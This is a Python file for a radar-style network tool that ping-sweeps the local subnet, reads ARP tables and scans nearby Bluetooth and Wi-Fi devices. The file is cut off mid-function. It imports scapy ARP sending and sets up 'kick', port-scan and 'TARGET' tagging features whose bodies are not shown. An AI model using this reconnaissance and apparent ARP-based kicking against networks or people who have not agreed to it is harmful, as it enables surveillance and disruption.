import pygame
import math
import subprocess
import socket
import threading
import time
import re
import hashlib
import sys
import struct
import io
import array
import asyncio
import random

try:
    from bleak import BleakScanner
    HAS_BLEAK = True
except ImportError:
    HAS_BLEAK = False

try:
    from scapy.all import ARP, Ether, send, sendp, getmacbyip, conf
    conf.verb = 0
    HAS_SCAPY = True
except ImportError:
    HAS_SCAPY = False

# ─── CONFIG ──────────────────────────────────────────────────────────────────
SCREEN_W, SCREEN_H = 1000, 750
RADAR_CENTER = (SCREEN_W // 2, SCREEN_H // 2)
RADAR_RADIUS = 280
FPS = 60
SWEEP_SPEED = 1.2
SCAN_INTERVAL = 15
BT_SCAN_INTERVAL = 10
DEVICE_TIMEOUT_NET = 45
DEVICE_TIMEOUT_BT = 30
DEVICE_TIMEOUT_WIFI = 40

# ─── COLORS ──────────────────────────────────────────────────────────────────
BLACK = (0, 0, 0)
DARK_GREEN = (0, 40, 0)
GREEN = (0, 180, 0)
BRIGHT_GREEN = (0, 255, 0)
DIM_GREEN = (0, 80, 0)
FAINT_GREEN = (0, 30, 0)
AMBER = (255, 180, 0)
DIM_AMBER = (120, 80, 0)
RED = (255, 60, 60)
DIM_RED = (120, 30, 30)
WHITE = (255, 255, 255)
DARK_BG = (2, 4, 2)
HUD_GREEN = (0, 220, 100)
GRID_GREEN = (0, 45, 0)
SWEEP_GREEN = (0, 255, 0)
CYAN = (0, 200, 255)
DIM_CYAN = (0, 80, 120)
BRIGHT_CYAN = (0, 255, 255)
APPLE_BLUE = (80, 160, 255)
PANEL_BG = (0, 8, 0)
PANEL_BORDER = (0, 60, 0)
ACCENT_GREEN = (0, 140, 40)
YELLOW = (255, 255, 0)
ORANGE = (255, 120, 0)
PURPLE = (180, 80, 255)
DIM_PURPLE = (80, 40, 120)
BRIGHT_PURPLE = (220, 140, 255)
WIFI_SCAN_INTERVAL = 20

COLOR_PRESETS = [
    ("Default", None),
    ("Red", (255, 60, 60)),
    ("Amber", (255, 180, 0)),
    ("Cyan", (0, 200, 255)),
    ("Purple", (180, 80, 255)),
    ("Orange", (255, 120, 0)),
    ("Yellow", (255, 255, 0)),
    ("White", (255, 255, 255)),
    ("Pink", (255, 100, 200)),
    ("Blue", (80, 160, 255)),
]

SAMPLE_RATE = 44100

# ─── MAC OUI VENDOR DATABASE (common prefixes) ──────────────────────────────
MAC_VENDORS = {
    "00:50:56": "VMware", "00:0C:29": "VMware", "00:1A:11": "Google",
    "3C:5A:B4": "Google", "F4:F5:D8": "Google", "A4:77:33": "Google",
    "00:17:88": "Philips Hue", "AC:CF:85": "Espressif",
    "24:0A:C4": "Espressif", "30:AE:A4": "Espressif",
    "B8:27:EB": "Raspberry Pi", "DC:A6:32": "Raspberry Pi",
    "00:1E:06": "WIBRAIN", "00:25:00": "Apple",
    "3C:15:C2": "Apple", "A4:B1:97": "Apple", "AC:BC:32": "Apple",
    "F0:99:BF": "Apple", "04:F7:E4": "Apple", "28:6A:BA": "Apple",
    "3C:E0:72": "Apple", "70:56:81": "Apple", "78:7B:8A": "Apple",
    "88:66:A5": "Apple", "9C:20:7B": "Apple", "A8:66:7F": "Apple",
    "BC:52:B7": "Apple", "C8:69:CD": "Apple", "D0:03:4B": "Apple",
    "F4:5C:89": "Apple", "00:1C:B3": "Apple", "64:A2:F9": "Apple",
    "C0:A5:3E": "Apple",
    "00:1A:2B": "Cisco", "00:26:CB": "Cisco", "00:1B:D5": "Cisco",
    "B4:E6:2D": "TP-Link", "50:C7:BF": "TP-Link", "60:32:B1": "TP-Link",
    "C0:25:E9": "TP-Link", "98:DA:C4": "TP-Link",
    "00:14:BF": "Linksys", "C0:56:27": "Belkin",
    "2C:F0:5D": "Microsoft", "28:18:78": "Microsoft", "7C:1E:52": "Microsoft",
    "00:0D:3A": "Microsoft", "00:15:5D": "Microsoft (Hyper-V)",
    "00:26:B6": "Asus", "1C:87:2C": "Asus", "AC:22:05": "Asus",
    "10:C3:7B": "Samsung", "00:21:19": "Samsung", "00:26:37": "Samsung",
    "34:23:BA": "Samsung", "84:25:DB": "Samsung", "8C:71:F8": "Samsung",
    "00:24:E4": "Huawei", "00:E0:FC": "Huawei", "04:F9:38": "Huawei",
    "48:46:FB": "Huawei", "70:72:3C": "Huawei",
    "00:0F:00": "Dell", "14:18:77": "Dell", "B8:AC:6F": "Dell",
    "00:1E:68": "Intel", "00:15:00": "Intel", "3C:97:0E": "Intel",
    "00:23:24": "Hewlett-Packard", "3C:D9:2B": "Hewlett-Packard",
    "00:1F:16": "Nokia", "00:21:AB": "Nokia",
    "00:24:D7": "Amazon", "44:65:0D": "Amazon", "A0:02:DC": "Amazon",
    "68:54:FD": "Amazon", "FC:65:DE": "Amazon",
    "00:1D:43": "Netgear", "20:4E:7F": "Netgear", "B0:48:7A": "Netgear",
    "D8:EB:46": "Google Nest", "54:60:09": "Google Nest",
    "00:04:4B": "Nvidia", "04:4B:FF": "Nvidia",
    "B0:BE:76": "Xiaomi", "64:CC:2E": "Xiaomi", "78:11:DC": "Xiaomi",
    "00:1E:C2": "LG", "10:68:3F": "LG", "A8:23:FE": "LG",
    "00:13:77": "Sony", "04:5D:4B": "Sony", "78:84:3C": "Sony",
}

COMMON_PORTS = {
    21: "FTP", 22: "SSH", 23: "Telnet", 25: "SMTP", 53: "DNS",
    80: "HTTP", 110: "POP3", 135: "RPC", 139: "NetBIOS", 143: "IMAP",
    443: "HTTPS", 445: "SMB", 993: "IMAPS", 995: "POP3S",
    3306: "MySQL", 3389: "RDP", 5432: "PostgreSQL", 5900: "VNC",
    8080: "HTTP-ALT", 8443: "HTTPS-ALT", 8888: "HTTP-ALT2",
}


def lookup_mac_vendor(mac):
    prefix = mac.upper().replace("-", ":")[:8]
    return MAC_VENDORS.get(prefix, "")


def generate_tone(freq, duration, volume=0.5, fade_out=True, wave_type="sine"):
    n_samples = int(SAMPLE_RATE * duration)
    buf = array.array("h", [0] * n_samples)
    for i in range(n_samples):
        t = i / SAMPLE_RATE
        env = max(0.0, 1.0 - (i / n_samples)) if fade_out else 1.0
        if wave_type == "sine":
            val = math.sin(2 * math.pi * freq * t)
        elif wave_type == "square":
            val = 1.0 if math.sin(2 * math.pi * freq * t) >= 0 else -1.0
        elif wave_type == "saw":
            val = 2.0 * (t * freq - math.floor(t * freq + 0.5))
        else:
            val = math.sin(2 * math.pi * freq * t)
        buf[i] = int(val * env * volume * 32767)
    return buf


def make_wav_bytes(samples):
    n = len(samples)
    data = struct.pack(f"<{n}h", *samples)
    header = struct.pack(
        "<4sI4s4sIHHIIHH4sI",
        b"RIFF", 36 + len(data), b"WAVE", b"fmt ", 16,
        1, 1, SAMPLE_RATE, SAMPLE_RATE * 2, 2, 16,
        b"data", len(data),
    )
    return header + data


def sound_from_samples(samples):
    wav = make_wav_bytes(samples)
    return pygame.mixer.Sound(buffer=io.BytesIO(wav).read())


def build_sweep_ping():
    t1 = generate_tone(1800, 0.06, volume=0.3, fade_out=True)
    t2 = generate_tone(2400, 0.04, volume=0.2, fade_out=True)
    combined = array.array("h", [0] * max(len(t1), len(t2)))
    for i in range(len(combined)):
        v = (t1[i] if i < len(t1) else 0) + (t2[i] if i < len(t2) else 0)
        combined[i] = max(-32767, min(32767, v))
    return sound_from_samples(combined)


def build_contact_blip():
    beep1 = generate_tone(1200, 0.05, volume=0.35, fade_out=True)
    gap = array.array("h", [0] * int(SAMPLE_RATE * 0.04))
    beep2 = generate_tone(1600, 0.05, volume=0.25, fade_out=True)
    combined = array.array("h")
    combined.extend(beep1)
    combined.extend(gap)
    combined.extend(beep2)
    return sound_from_samples(combined)


def build_startup_sound():
    parts = array.array("h")
    for f in [400, 600, 900, 1200, 1800]:
        parts.extend(generate_tone(f, 0.08, volume=0.3, fade_out=True, wave_type="square"))
        parts.extend(array.array("h", [0] * int(SAMPLE_RATE * 0.03)))
    parts.extend(generate_tone(1800, 0.3, volume=0.25, fade_out=True))
    return sound_from_samples(parts)


def build_scan_start():
    b1 = generate_tone(800, 0.08, volume=0.2, fade_out=True, wave_type="square")
    gap = array.array("h", [0] * int(SAMPLE_RATE * 0.05))
    b2 = generate_tone(1100, 0.12, volume=0.2, fade_out=True, wave_type="square")
    combined = array.array("h")
    combined.extend(b1)
    combined.extend(gap)
    combined.extend(b2)
    return sound_from_samples(combined)


def build_ambient_hum():
    n = int(SAMPLE_RATE * 2.0)
    buf = array.array("h", [0] * n)
    for i in range(n):
        t = i / SAMPLE_RATE
        v = math.sin(2 * math.pi * 60 * t) * 0.04
        v += math.sin(2 * math.pi * 120 * t) * 0.02
        v += math.sin(2 * math.pi * 90 * t) * 0.015
        buf[i] = int(v * 32767)
    return sound_from_samples(buf)


class SoundEngine:
    def __init__(self):
        pygame.mixer.init(frequency=SAMPLE_RATE, size=-16, channels=1, buffer=1024)
        self.sweep_ping = build_sweep_ping()
        self.contact_blip = build_contact_blip()
        self.startup_sound = build_startup_sound()
        self.scan_start = build_scan_start()
        self.ambient_hum = build_ambient_hum()
        self.muted = False
        self._known_macs = set()

    def play_startup(self):
        if not self.muted:
            self.startup_sound.play()
            self.ambient_hum.play(loops=-1)

    def play_sweep_ping(self):
        if not self.muted:
            self.sweep_ping.play()

    def play_scan_start(self):
        if not self.muted:
            self.scan_start.play()

    def check_new_contacts(self, devices):
        if self.muted:
            return
        for mac in devices:
            if mac not in self._known_macs:
                self._known_macs.add(mac)
                self.contact_blip.play()

    def toggle_mute(self):
        self.muted = not self.muted
        if self.muted:
            pygame.mixer.stop()
        else:
            self.ambient_hum.play(loops=-1)


class Device:
    def __init__(self, ip, mac, hostname):
        self.ip = ip
        self.mac = mac
        self.hostname = hostname
        self.angle = 0.0
        self.distance = 0.0
        self.blip_alpha = 255
        self.first_seen = time.time()
        self.last_seen = time.time()
        self.is_self = False
        self._assign_position()

    @property
    def device_type(self):
        h = self.hostname.lower() if self.hostname else ""
        if any(k in h for k in ["router", "gateway", "modem", "mikrotik", "ubnt", "netgear", "tp-link", "asus"]):
            return "ROUTER"
        if any(k in h for k in ["iphone", "ipad", "android", "galaxy", "pixel", "huawei", "xiaomi", "oneplus"]):
            return "PHONE"
        if any(k in h for k in ["laptop", "macbook", "thinkpad", "surface", "notebook"]):
            return "LAPTOP"
        if any(k in h for k in ["desktop", "pc", "tower", "workstation"]):
            return "DESKTOP"
        if any(k in h for k in ["printer", "canon", "epson", "hp-", "brother"]):
            return "PRINTER"
        if any(k in h for k in ["tv", "roku", "firestick", "chromecast", "smart"]):
            return "IOT"
        if any(k in h for k in ["camera", "cam", "ring", "nest"]):
            return "CAMERA"
        return ""

    @property
    def vendor(self):
        return lookup_mac_vendor(self.mac)

    def _assign_position(self):
        h = hashlib.md5(self.mac.encode()).hexdigest()
        self.angle = (int(h[:8], 16) / 0xFFFFFFFF) * 2 * math.pi
        self.distance = 0.25 + (int(h[8:16], 16) / 0xFFFFFFFF) * 0.65

    def radar_pos(self, center, radius):
        r = self.distance * radius
        x = center[0] + r * math.cos(self.angle)
        y = center[1] + r * math.sin(self.angle)
        return int(x), int(y)


class NetworkScanner:
    def __init__(self):
        self.devices = {}
        self.my_ip = self._get_my_ip()
        self.subnet = self._get_subnet()
        self.gateway_ip = self._get_gateway_ip()
        self.gateway_mac = None
        self.scanning = False
        self.last_scan = 0

    def _get_gateway_ip(self):
        try:
            result = subprocess.run(
                ["ipconfig"], capture_output=True, text=True,
                creationflags=subprocess.CREATE_NO_WINDOW,
            )
            for line in result.stdout.splitlines():
                if "Default Gateway" in line:
                    match = re.search(r"(\d+\.\d+\.\d+\.\d+)", line)
                    if match:
                        return match.group(1)
        except Exception:
            pass
        return None

    def _get_my_ip(self):
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.connect(("8.8.8.8", 80))
            ip = s.getsockname()[0]
            s.close()
            return ip
        except Exception:
            return "127.0.0.1"

    def _get_subnet(self):
        parts = self.my_ip.rsplit(".", 1)
        return parts[0] if len(parts) == 2 else "192.168.1"

    def _resolve_hostname(self, ip):
        try:
            return socket.gethostbyaddr(ip)[0]
        except Exception:
            return ""

    def _ping_sweep(self):
        threads = []
        for i in range(1, 255):
            ip = f"{self.subnet}.{i}"
            t = threading.Thread(
                target=lambda addr: subprocess.run(
                    ["ping", "-n", "1", "-w", "300", addr],
                    stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL,
                    creationflags=subprocess.CREATE_NO_WINDOW,
                ),
                args=(ip,), daemon=True,
            )
            threads.append(t)

        batch_size = 50
        for batch_start in range(0, len(threads), batch_size):
            batch = threads[batch_start:batch_start + batch_size]
            for t in batch:
                t.start()
            for t in batch:
                t.join(timeout=2)

    def _read_arp_table(self):
        try:
            result = subprocess.run(
                ["arp", "-a"], capture_output=True, text=True,
                creationflags=subprocess.CREATE_NO_WINDOW,
            )
            entries = []
            for line in result.stdout.splitlines():
                match = re.search(r"(\d+\.\d+\.\d+\.\d+)\s+([\w-]{17})\s+(\w+)", line)
                if match:
                    ip, mac, dtype = match.group(1), match.group(2), match.group(3)
                    if mac != "ff-ff-ff-ff-ff-ff" and dtype != "invalid":
                        entries.append((ip, mac))
            return entries
        except Exception:
            return []

    def scan(self):
        if self.scanning:
            return
        self.scanning = True

        def _do_scan():
            self._ping_sweep()
            time.sleep(1)
            entries = self._read_arp_table()
            for ip, mac in entries:
                if mac not in self.devices:
                    hostname = self._resolve_hostname(ip)
                    dev = Device(ip, mac, hostname)
                    if ip == self.my_ip:
                        dev.is_self = True
                        dev.distance = 0.0
                        dev.angle = 0.0
                    self.devices[mac] = dev
                else:
                    self.devices[mac].ip = ip
                    self.devices[mac].last_seen = time.time()
                if self.gateway_ip and ip == self.gateway_ip:
                    self.gateway_mac = mac.replace("-", ":").upper()
            self.scanning = False
            self.last_scan = time.time()

        threading.Thread(target=_do_scan, daemon=True).start()


APPLE_CONTINUITY_TYPES = {
    0x02: "iBeacon", 0x03: "AirPrint", 0x05: "AirDrop",
    0x06: "HomeKit", 0x07: "AirPods", 0x08: "Hey Siri",
    0x09: "AirPlay", 0x0C: "Handoff", 0x0D: "Wi-Fi Settings",
    0x0E: "Hotspot", 0x0F: "Nearby Info", 0x10: "Nearby Action",
    0x12: "Find My",
}


class BluetoothDevice:
    def __init__(self, address, name, rssi, apple_services=None):
        self.address = address
        self.name = name or ""
        self.rssi = rssi
        self.apple_services = apple_services or []
        self.first_seen = time.time()
        self.last_seen = time.time()
        self.angle = 0.0
        self.distance = 0.0
        self._assign_position()

    def _assign_position(self):
        h = hashlib.md5(self.address.encode()).hexdigest()
        self.angle = (int(h[:8], 16) / 0xFFFFFFFF) * 2 * math.pi
        base_dist = 0.2 + (int(h[8:16], 16) / 0xFFFFFFFF) * 0.7
        if self.rssi != 0:
            rssi_norm = max(0.0, min(1.0, (abs(self.rssi) - 30) / 70.0))
            self.distance = 0.15 + rssi_norm * 0.75
        else:
            self.distance = base_dist

    def radar_pos(self, center, radius):
        r = self.distance * radius
        x = center[0] + r * math.cos(self.angle)
        y = center[1] + r * math.sin(self.angle)
        return int(x), int(y)

    @property
    def display_name(self):
        return self.name if self.name else self.address[-8:]

    @property
    def is_apple(self):
        return len(self.apple_services) > 0

    @property
    def has_airdrop(self):
        return "AirDrop" in self.apple_services


class BluetoothScanner:
    def __init__(self):
        self.devices = {}
        self.scanning = False
        self.last_scan = 0
        self.enabled = HAS_BLEAK
        self._loop = None
        self._loop_thread = None
        if self.enabled:
            self._start_event_loop()

    def _start_event_loop(self):
        self._loop = asyncio.new_event_loop()

        def run_loop():
            asyncio.set_event_loop(self._loop)
            self._loop.run_forever()

        self._loop_thread = threading.Thread(target=run_loop, daemon=True)
        self._loop_thread.start()

    @staticmethod
    def _parse_apple_manufacturer_data(manufacturer_data):
        apple_services = []
        apple_data = manufacturer_data.get(0x004C)
        if apple_data is None:
            return apple_services
        i = 0
        while i + 1 < len(apple_data):
            type_byte = apple_data[i]
            length = apple_data[i + 1]
            service_name = APPLE_CONTINUITY_TYPES.get(type_byte)
            if service_name:
                apple_services.append(service_name)
            i += 2 + length
        return apple_services

    def scan(self):
        if self.scanning or not self.enabled:
            return
        self.scanning = True
        future = asyncio.run_coroutine_threadsafe(self._do_scan(), self._loop)
        future.add_done_callback(lambda f: None)

    async def _do_scan(self):
        try:
            discovered = await BleakScanner.discover(timeout=5.0, return_adv=True)
            for address, (device, adv_data) in discovered.items():
                mfr_data = adv_data.manufacturer_data or {}
                apple_services = self._parse_apple_manufacturer_data(mfr_data)
                addr = device.address.upper()
                rssi = adv_data.rssi if adv_data.rssi else 0
                name = device.name or adv_data.local_name or ""
                if addr in self.devices:
                    dev = self.devices[addr]
                    dev.rssi = rssi
                    dev.last_seen = time.time()
                    if name:
                        dev.name = name
                    if apple_services:
                        for s in apple_services:
                            if s not in dev.apple_services:
                                dev.apple_services.append(s)
                    dev._assign_position()
                else:
                    self.devices[addr] = BluetoothDevice(addr, name, rssi, apple_services)
        except Exception:
            pass
        finally:
            self.scanning = False
            self.last_scan = time.time()


class WifiNetwork:
    def __init__(self, ssid, bssid, signal, auth, encryption, channel, band, radio_type):
        self.ssid = ssid
        self.bssid = bssid
        self.signal = signal
        self.auth = auth
        self.encryption = encryption
        self.channel = channel
        self.band = band
        self.radio_type = radio_type
        self.first_seen = time.time()
        self.last_seen = time.time()
        self.angle = 0.0
        self.distance = 0.0
        self._assign_position()

    def _assign_position(self):
        h = hashlib.md5(self.bssid.encode()).hexdigest()
        self.angle = (int(h[:8], 16) / 0xFFFFFFFF) * 2 * math.pi
        self.distance = 0.1 + (1.0 - self.signal / 100.0) * 0.8

    def radar_pos(self, center, radius):
        r = self.distance * radius
        x = center[0] + r * math.cos(self.angle)
        y = center[1] + r * math.sin(self.angle)
        return int(x), int(y)

    @property
    def display_name(self):
        return self.ssid if self.ssid else "(Hidden)"

    @property
    def is_open(self):
        return self.auth.lower() in ("open", "")

    @property
    def security_level(self):
        a = self.auth.lower()
        if "wpa3" in a:
            return 3
        if "wpa2" in a:
            return 2
        if "wpa" in a:
            return 1
        return 0

    @property
    def vendor(self):
        return lookup_mac_vendor(self.bssid)


class WifiScanner:
    def __init__(self):
        self.networks = {}
        self.scanning = False
        self.last_scan = 0

    def scan(self):
        if self.scanning:
            return
        self.scanning = True
        threading.Thread(target=self._do_scan, daemon=True).start()

    def _do_scan(self):
        try:
            result = subprocess.run(
                ["netsh", "wlan", "show", "networks", "mode=bssid"],
                capture_output=True, text=True, timeout=10,
                creationflags=subprocess.CREATE_NO_WINDOW,
            )
            self._parse_output(result.stdout)
        except Exception:
            pass
        finally:
            self.scanning = False
            self.last_scan = time.time()

    def _parse_output(self, output):
        current_ssid = ""
        current_auth = ""
        current_enc = ""
        current_bssid = ""
        current_signal = 0
        current_channel = 0
        current_band = ""
        current_radio = ""

        for line in output.splitlines():
            line = line.strip()
            if line.startswith("SSID") and "BSSID" not in line:
                parts = line.split(":", 1)
                if len(parts) == 2:
                    current_ssid = parts[1].strip()
            elif line.startswith("Authentication"):
                parts = line.split(":", 1)
                if len(parts) == 2:
                    current_auth = parts[1].strip()
            elif line.startswith("Encryption"):
                parts = line.split(":", 1)
                if len(parts) == 2:
                    current_enc = parts[1].strip()
            elif line.startswith("BSSID"):
                parts = line.split(":", 1)
                if len(parts) == 2:
                    current_bssid = parts[1].strip()
            elif line.startswith("Signal"):
                parts = line.split(":", 1)
                if len(parts) == 2:
                    try:
                        current_signal = int(parts[1].strip().replace("%", ""))
                    except ValueError:
                        current_signal = 0
            elif line.startswith("Channel"):
                parts = line.split(":", 1)
                if len(parts) == 2:
                    try:
                        current_channel = int(parts[1].strip())
                    except ValueError:
                        current_channel = 0
            elif line.startswith("Band"):
                parts = line.split(":", 1)
                if len(parts) == 2:
                    current_band = parts[1].strip()
            elif line.startswith("Radio type"):
                parts = line.split(":", 1)
                if len(parts) == 2:
                    current_radio = parts[1].strip()

            if current_bssid and current_signal > 0:
                bssid_key = current_bssid.upper()
                if bssid_key in self.networks:
                    net = self.networks[bssid_key]
                    net.signal = current_signal
                    net.last_seen = time.time()
                    net._assign_position()
                else:
                    self.networks[bssid_key] = WifiNetwork(
                        current_ssid, current_bssid, current_signal,
                        current_auth, current_enc, current_channel,
                        current_band, current_radio,
                    )
                current_bssid = ""
                current_signal = 0
                current_channel = 0
                current_band = ""
                current_radio = ""


# ─── VISUAL HELPERS ──────────────────────────────────────────────────────────

def build_vignette(w, h):
    surf = pygame.Surface((w, h), pygame.SRCALPHA)
    cx, cy = w // 2, h // 2
    max_r = math.sqrt(cx * cx + cy * cy)
    for r in range(int(max_r), 0, -4):
        frac = r / max_r
        alpha = int(max(0, (frac - 0.5) * 2.0) ** 2 * 180)
        if alpha > 0:
            pygame.draw.circle(surf, (0, 0, 0, alpha), (cx, cy), r)
    return surf


def build_scanlines(w, h, spacing=3, alpha=25):
    surf = pygame.Surface((w, h), pygame.SRCALPHA)
    for y in range(0, h, spacing):
        pygame.draw.line(surf, (0, 0, 0, alpha), (0, y), (w, y), 1)
    return surf


def draw_panel(screen, x, y, w, h, border_color=PANEL_BORDER, fill_alpha=180):
    panel = pygame.Surface((w, h), pygame.SRCALPHA)
    panel.fill((*PANEL_BG, fill_alpha))
    pygame.draw.rect(panel, (*border_color, 200), (0, 0, w, h), 1)
    corner = 6
    for cx, cy in [(1, 1), (w - corner, 1), (1, h - corner), (w - corner, h - corner)]:
        pygame.draw.line(panel, (*border_color, 255), (cx, cy), (cx + corner, cy), 1)
        pygame.draw.line(panel, (*border_color, 255), (cx, cy), (cx, cy + corner), 1)
    screen.blit(panel, (x, y))


def draw_progress_bar(screen, x, y, w, h, progress, color=GREEN, bg_color=(0, 20, 0)):
    pygame.draw.rect(screen, bg_color, (x, y, w, h))
    fill_w = int(w * max(0, min(1, progress)))
    if fill_w > 0:
        bar = pygame.Surface((fill_w, h), pygame.SRCALPHA)
        bar.fill((*color, 180))
        screen.blit(bar, (x, y))
    pygame.draw.rect(screen, color, (x, y, w, h), 1)


class UAVRadar:
    def __init__(self):
        pygame.init()
        self.sound = SoundEngine()
        self.screen = pygame.display.set_mode((SCREEN_W, SCREEN_H))
        pygame.display.set_caption("UAV ONLINE // NETWORK RADAR")
        self.clock = pygame.time.Clock()
        self.sweep_angle = 0.0
        self.prev_sweep_lap = 0
        self.scanner = NetworkScanner()

        self.font_title = pygame.font.SysFont("Consolas", 32, bold=True)
        self.font_big = pygame.font.SysFont("Consolas", 22, bold=True)
        self.font_med = pygame.font.SysFont("Consolas", 15)
        self.font_small = pygame.font.SysFont("Consolas", 12)
        self.font_tiny = pygame.font.SysFont("Consolas", 10)
        self.font_hud = pygame.font.SysFont("Consolas", 18, bold=True)

        self.start_time = time.time()
        self.bt_scanner = BluetoothScanner()
        self.wifi_scanner = WifiScanner()
        self.show_bt = True
        self.show_wifi = True
        self.selected_id = None
        self.selected_type = None
        self.hidden_devices = set()
        self.tagged_devices = {}
        self.hover_id = None
        self.hover_type = None
        self.device_notes = {}
        self.export_flash = 0
        self.event_log = []
        self.scan_count = 0
        self.total_devices_ever = 0
        self.port_scan_results = {}
        self.port_scanning = False
        self.alert_queue = []
        self._prev_net_macs = set()
        self._prev_bt_addrs = set()

        self.device_aliases = {}
        self.device_colors = {}
        self.device_custom_pos = {}
        self.kicked_devices = {}
        self._kick_threads = {}
        self.text_input_active = False
        self.text_input_buffer = ""
        self.text_input_prompt = ""
        self.text_input_action = None
        self.dragging_id = None
        self.dragging_type = None

        self.vignette = build_vignette(SCREEN_W, SCREEN_H)
        self.scanlines = build_scanlines(SCREEN_W, SCREEN_H, spacing=2, alpha=18)
        self.sweep_surface = pygame.Surface((SCREEN_W, SCREEN_H), pygame.SRCALPHA)
        self.noise_timer = 0
        self.noise_surface = self._build_noise()

        self._prev_wifi_bssids = set()

        self.sound.play_startup()
        self.scanner.scan()
        self.bt_scanner.scan()
        self.wifi_scanner.scan()
        self.sound.play_scan_start()

    def _build_noise(self):
        surf = pygame.Surface((SCREEN_W, SCREEN_H), pygame.SRCALPHA)
        for _ in range(120):
            x = random.randint(0, SCREEN_W)
            y = random.randint(0, SCREEN_H)
            a = random.randint(5, 20)
            surf.set_at((x, y), (0, 255, 0, a))
        return surf

    def run(self):
        running = True
        while running:
            dt = self.clock.tick(FPS) / 1000.0

            for event in pygame.event.get():
                if event.type == pygame.QUIT:
                    running = False

                if self.text_input_active:
                    if event.type == pygame.KEYDOWN:
                        if event.key == pygame.K_RETURN:
                            self._finish_text_input()
                        elif event.key == pygame.K_ESCAPE:
                            self.text_input_active = False
                            self.text_input_buffer = ""
                            self.text_input_action = None
                        elif event.key == pygame.K_BACKSPACE:
                            self.text_input_buffer = self.text_input_buffer[:-1]
                        else:
                            ch = event.unicode
                            if ch and len(self.text_input_buffer) < 40:
                                self.text_input_buffer += ch
                    continue

                if event.type == pygame.KEYDOWN:
                    if event.key == pygame.K_ESCAPE:
                        running = False
                    if event.key == pygame.K_r:
                        self.scanner.scan()
                        self.bt_scanner.scan()
                        self.wifi_scanner.scan()
                        self.sound.play_scan_start()
                        self.scan_count += 1
                        self._log_event("Manual rescan triggered")
                    if event.key == pygame.K_m:
                        self.sound.toggle_mute()
                    if event.key == pygame.K_b:
                        self.show_bt = not self.show_bt
                    if event.key == pygame.K_w:
                        self.show_wifi = not self.show_wifi
                    if event.key == pygame.K_DELETE or event.key == pygame.K_x:
                        self._delete_selected()
                    if event.key == pygame.K_t:
                        self._cycle_tag()
                    if event.key == pygame.K_c:
                        self.selected_id = None
                        self.selected_type = None
                    if event.key == pygame.K_s:
                        self._export_devices()
                    if event.key == pygame.K_n:
                        self._add_note()
                    if event.key == pygame.K_u:
                        self.hidden_devices.clear()
                        self._log_event("Unhid all devices")
                    if event.key == pygame.K_p:
                        self._port_scan_selected()
                    if event.key == pygame.K_F12:
                        self._screenshot()
                    if event.key == pygame.K_k:
                        self._toggle_kick()
                    if event.key == pygame.K_F2:
                        self._start_rename()
                    if event.key == pygame.K_F3:
                        self._cycle_color()
                    if event.key == pygame.K_F4:
                        self._start_custom_tag()
                if event.type == pygame.MOUSEBUTTONDOWN:
                    if event.button == 1:
                        mods = pygame.key.get_mods()
                        if mods & pygame.KMOD_SHIFT:
                            self._start_drag(event.pos)
                        else:
                            self._handle_click(event.pos)
                    elif event.button == 3:
                        self._handle_click(event.pos)
                        self._cycle_tag()
                if event.type == pygame.MOUSEBUTTONUP:
                    if event.button == 1 and self.dragging_id is not None:
                        self._stop_drag()
                if event.type == pygame.MOUSEMOTION:
                    if self.dragging_id is not None:
                        self._update_drag(event.pos)
                    else:
                        self._handle_hover(event.pos)

            self.sweep_angle += SWEEP_SPEED * dt
            lap = int(self.sweep_angle / (2 * math.pi))
            if lap > self.prev_sweep_lap:
                self.sound.play_sweep_ping()
                self.prev_sweep_lap = lap
            if self.sweep_angle > 2 * math.pi:
                self.sweep_angle -= 2 * math.pi

            self.sound.check_new_contacts(self.scanner.devices)

            if time.time() - self.scanner.last_scan > SCAN_INTERVAL and not self.scanner.scanning:
                self.scanner.scan()
                self.sound.play_scan_start()
                self.scan_count += 1
                self._log_event("Auto network scan")

            if (self.show_bt and self.bt_scanner.enabled
                    and time.time() - self.bt_scanner.last_scan > BT_SCAN_INTERVAL
                    and not self.bt_scanner.scanning):
                self.bt_scanner.scan()

            if (self.show_wifi
                    and time.time() - self.wifi_scanner.last_scan > WIFI_SCAN_INTERVAL
                    and not self.wifi_scanner.scanning):
                self.wifi_scanner.scan()

            self._check_new_devices()
            self._cleanup_stale_devices()

            self.noise_timer += dt
            if self.noise_timer > 0.15:
                self.noise_timer = 0
                self.noise_surface = self._build_noise()

            self._draw(dt)
            pygame.display.flip()

        for mac in list(self.kicked_devices.keys()):
            self._unkick_device(mac)
        time.sleep(0.5)
        pygame.quit()
        sys.exit()

    def _handle_click(self, mouse_pos):
        closest_id = None
        closest_type = None
        closest_dist = 22

        for mac, dev in self.scanner.devices.items():
            if mac in self.hidden_devices:
                continue
            pos = self._get_radar_pos(mac, dev)
            dx, dy = mouse_pos[0] - pos[0], mouse_pos[1] - pos[1]
            dist = math.sqrt(dx * dx + dy * dy)
            if dist < closest_dist:
                closest_dist = dist
                closest_id = mac
                closest_type = "net"

        if self.show_bt:
            for addr, dev in self.bt_scanner.devices.items():
                if addr in self.hidden_devices:
                    continue
                pos = self._get_radar_pos(addr, dev)
                dx, dy = mouse_pos[0] - pos[0], mouse_pos[1] - pos[1]
                dist = math.sqrt(dx * dx + dy * dy)
                if dist < closest_dist:
                    closest_dist = dist
                    closest_id = addr
                    closest_type = "bt"

        if self.show_wifi:
            for bssid, net in self.wifi_scanner.networks.items():
                if bssid in self.hidden_devices:
                    continue
                pos = self._get_radar_pos(bssid, net)
                dx, dy = mouse_pos[0] - pos[0], mouse_pos[1] - pos[1]
                dist = math.sqrt(dx * dx + dy * dy)
                if dist < closest_dist:
                    closest_dist = dist
                    closest_id = bssid
                    closest_type = "wifi"

        self.selected_id = closest_id
        self.selected_type = closest_type

    def _delete_selected(self):
        if self.selected_id is None:
            return
        self.hidden_devices.add(self.selected_id)
        self.selected_id = None
        self.selected_type = None

    def _cycle_tag(self):
        if self.selected_id is None:
            return
        tags = ["KNOWN", "SUSPECT", "TARGET"]
        current = self.tagged_devices.get(self.selected_id)
        if current is None:
            self.tagged_devices[self.selected_id] = tags[0]
        else:
            idx = tags.index(current) if current in tags else -1
            if idx >= len(tags) - 1:
                del self.tagged_devices[self.selected_id]
            else:
                self.tagged_devices[self.selected_id] = tags[idx + 1]

    def _log_event(self, msg):
        timestamp = time.strftime("%H:%M:%S")
        self.event_log.append((timestamp, msg))
        if len(self.event_log) > 50:
            self.event_log.pop(0)

    def _check_new_devices(self):
        current_net = set(self.scanner.devices.keys())
